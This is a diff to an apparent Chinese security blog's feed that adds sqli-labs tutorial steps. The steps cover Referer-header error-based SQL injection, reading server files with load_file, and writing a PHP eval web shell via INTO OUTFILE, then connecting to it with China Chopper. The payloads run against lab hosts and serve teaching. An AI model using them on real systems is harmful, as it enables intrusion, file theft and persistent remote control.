@@ -740,7 +740,12 @@
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -script external idefun.com</span><br></pre></td></tr></table></figure>
 <p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712145517002.png" alt=""></p>
 <p>更多扫描脚本的使用方法可参见<a href="https://nmap.org/nsedoc/categories">https://nmap.org/nsedoc/categories</a>.</p>
-<h2 id="Web安全原理剖析"><a href="#Web安全原理剖析" class="headerlink" title="Web安全原理剖析"></a>Web安全原理剖析</h2><h3 id="SQL注入基础"><a href="#SQL注入基础" class="headerlink" title="SQL注入基础"></a>SQL注入基础</h3><h4 id="SQL注入简介"><a href="#SQL注入简介" class="headerlink" title="SQL注入简介"></a>SQL注入简介</h4><p>SQL注入就是指Web应用程序对用户输入数据的合法性没有判断，前端传入后端的参数是攻击者可控的，并且参数带入数据库查询，攻击者可以通过构造不同的SQL语句来实现对数据库的任意操作。</p>
+<h2 id="Web安全原理剖析"><a href="#Web安全原理剖析" class="headerlink" title="Web安全原理剖析"></a>Web安全原理剖析</h2><h3 id="SQL注入基础"><a href="#SQL注入基础" class="headerlink" title="SQL注入基础"></a>SQL注入基础</h3><p>注意:SQL注入使用的是sqli-lab靶场,可下载安装,也可使用在线靶场,网址如下:</p>
+<ul>
+<li><a href="http://sqli.bihuo.cn/">http://sqli.bihuo.cn/</a></li>
+<li><a href="https://sqli.wmcoder.site/sqli-labs/">https://sqli.wmcoder.site/sqli-labs/</a></li>
+</ul>
+<h4 id="SQL注入简介"><a href="#SQL注入简介" class="headerlink" title="SQL注入简介"></a>SQL注入简介</h4><p>SQL注入就是指Web应用程序对用户输入数据的合法性没有判断，前端传入后端的参数是攻击者可控的，并且参数带入数据库查询，攻击者可以通过构造不同的SQL语句来实现对数据库的任意操作。</p>
 <p>一般情况下，开发人员可以使用动态SQL语句创建通用、灵活的应用。动态SQL语句是在执行过程中构造的，它根据不同的条件产生不同的SQL语句。当开发人员在运行过程中需要根据不同的查询标准决定提取什么字段(如select语句)，或者根据不同的条件选择不同的查询表时，动态地构造SQL语句会非常有用。</p>
 <p>下面以PHP语句为例:<br>$query= “SELECT * FROM users WHERE id=$_GET [‘id’] “;</p>
 <p>由于这里的参数ID可控，且带入数据库查询，所以非法用户可以任意拼接SQL语句进行攻击。<br>当然，SQL注入按照不同的分类方法可以分为很多种，如报错注入、盲注、Union注入等。</p>
@@ -950,7 +955,81 @@
 <p>爆出用户名和密码</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin&#39; and 0 union select 1,group_concat(username,&#39;:&#39;,password),2 from users--+</span><br></pre></td></tr></table></figure>
 <p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210730094749551.png" alt=""></p>
-<h3 id="SQL注入绕过技术"><a href="#SQL注入绕过技术" class="headerlink" title="SQL注入绕过技术"></a>SQL注入绕过技术</h3>]]></content>
+<h4 id="HTTP-Referer注入"><a href="#HTTP-Referer注入" class="headerlink" title="HTTP-Referer注入"></a>HTTP-Referer注入</h4><p>测试地址:<a href="http://sqli.bihuo.cn/Less-19/">http://sqli.bihuo.cn/Less-19/</a></p>
+<p>用户名,密码均为admin</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210730174544006.png" alt=""></p>
+<p>登录后抓包,send to repeater</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210730174716710.png" alt=""></p>
+<p>通过修改referer来注入,加入单引号爆出下面内容</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210730175341423.png" alt=""></p>
+<p>在单引号后面加上)和#</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;sqli.bihuo.cn&#x2F;Less-19&#x2F;&#39;)#</span><br></pre></td></tr></table></figure>
+<p>未报错</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210730175540574.png" alt=""></p>
+<p>接下来尝试注入</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;sqli.bihuo.cn&#x2F;Less-19&#x2F;&#39;) and 1&#x3D;1#</span><br></pre></td></tr></table></figure>
+<p>爆出更多内容,发现两个内容间用逗号分隔,考虑insert和update语句</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210730175819763.png" alt=""></p>
+<p>猜测SQL语句为</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">insert into table(a,b,c) values(&#39;&#39;,&#39;&#39;,&#39;&#39;)</span><br></pre></td></tr></table></figure>
+<p>将语句修改为</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">insert into table(a,b,c) values(&#39;&#39; and &#39;&#39;,&#39;&#39;,&#39;&#39;)</span><br></pre></td></tr></table></figure>
+<p>没有报错</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210730180924270.png" alt=""></p>
+<p>结合报错注入构造注入语句(因在线靶场问题,我在本地做的)</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.88.149:9002&#x2F;Less%2D19&#x2F;&#39; and updatexml(1,concat(&#39;:&#39;,(select database(),1) and &#39;</span><br></pre></td></tr></table></figure>
+<p>成功爆出数据库名,接下来按照格式爆出其他数据</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210730183633721.png" alt=""></p>
+<h4 id="SQL注入读写文件"><a href="#SQL注入读写文件" class="headerlink" title="SQL注入读写文件"></a>SQL注入读写文件</h4><h5 id="SQL注入读取文件"><a href="#SQL注入读取文件" class="headerlink" title="SQL注入读取文件"></a>SQL注入读取文件</h5><p>测试地址:sqli-lab less-1 (这里我使用的是本地靶场,就不给出具体链接)</p>
+<p>所用函数:</p>
+<p>Load_file(file_name):读取文件并以字符串形式返回文件的内容</p>
+<p>使用条件:</p>
+<ol>
+<li>必须有权限读取并且文件必须完全可读</li>
+<li>欲读取文件必须在服务器上</li>
+<li>必须指定文件完整的路径</li>
+<li>欲读取文件必须小于max_allowed_packet</li>
+</ol>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210731164411812.png" alt=""></p>
+<p>这里我在本地靶机(windows系统)的C盘创建了一个1.txt,内容如下:</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210731164743629.png" alt=""></p>
+<p>结合UNION注入构造注入语句</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.88.141:86&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,2,load_file(&quot;C:\\1.txt&quot;) --+</span><br></pre></td></tr></table></figure>
+<p>结果如下,成功读取到1.txt中内容</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210731164820440.png" alt=""></p>
+<p>接下来读取Less-1的index.php</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.88.141:86&#x2F;Less-1&#x2F;?id&#x3D;-1%27%20union%20select%201,2,load_file(%22C:\\inetpub\\target\\sqlilabs\\Less-1\\index.php%22)%20--+</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210731165643623.png" alt=""></p>
+<p>将读取的php内容以16进制输出</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.88.141:86&#x2F;Less-1&#x2F;?id&#x3D;-1%27%20union%20select%201,2,hex(load_file(%22C:\\inetpub\\target\\sqlilabs\\Less-1\\index.php%22)%20)--+</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210731165816271.png" alt=""></p>
+<p>然后将16进制转换为字符串,即可得到源代码</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210801081055604.png" style="zoom:80%;" /></p>
+<h5 id="SQL注入写入文件"><a href="#SQL注入写入文件" class="headerlink" title="SQL注入写入文件"></a>SQL注入写入文件</h5><p>测试地址:sqli-lab Less-7</p>
+<p>所用函数:</p>
+<p>into outfile:在MySQL中,可以使用SELECT…INTO OUTFILE语句将表的内容导出成一个文本文件</p>
+<p>测试:在已知具体路径下新建a.txt并写入1,2,3</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.88.141:86&#x2F;Less-7&#x2F;?id&#x3D;-1&#39;)) union select 1,2,3 into outfile &quot;C:\\inetpub\\target\\sqlilabs\\Less-7\\a.txt&quot; --+</span><br></pre></td></tr></table></figure>
+<p>访问</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.88.141:86&#x2F;Less-7&#x2F;a.txt</span><br></pre></td></tr></table></figure>
+<p>成功写入</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210801091906766.png" alt=""></p>
+<p>注意:经测试,不能连续操作同一文件,只能创建并写入</p>
+<p>接下来搞点事情,写入一句话木马</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.88.141:86&#x2F;Less-7&#x2F;?id&#x3D;-1&#39;)) union select 1,2,&quot;&lt;?php @eval($_POST[value]);?&gt;&quot; into outfile &quot;C:\\inetpub\\target\\sqlilabs\\Less-7\\b.php&quot; --+</span><br></pre></td></tr></table></figure>
+<p>访问</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.88.141:86&#x2F;Less-7&#x2F;b.php</span><br></pre></td></tr></table></figure>
+<p>成功写入</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210801092134302.png" alt=""></p>
+<p>使用中国菜刀连接,右键点击添加</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210801092259822.png" alt=""></p>
+<p>输入网址和value,点击添加</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210801092409746.png" alt=""></p>
+<p>右键选择文件管理</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210801092556335.png" alt=""></p>
+<p>成功</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210801092638007.png" alt=""></p>
+<h3 id="SQL注入绕过技术"><a href="#SQL注入绕过技术" class="headerlink" title="SQL注入绕过技术"></a>SQL注入绕过技术</h3><h4 id="绕过注释符过滤"><a href="#绕过注释符过滤" class="headerlink" title="绕过注释符过滤"></a>绕过注释符过滤</h4>]]></content>
       <categories>
         <category>Hack</category>
       </categories>
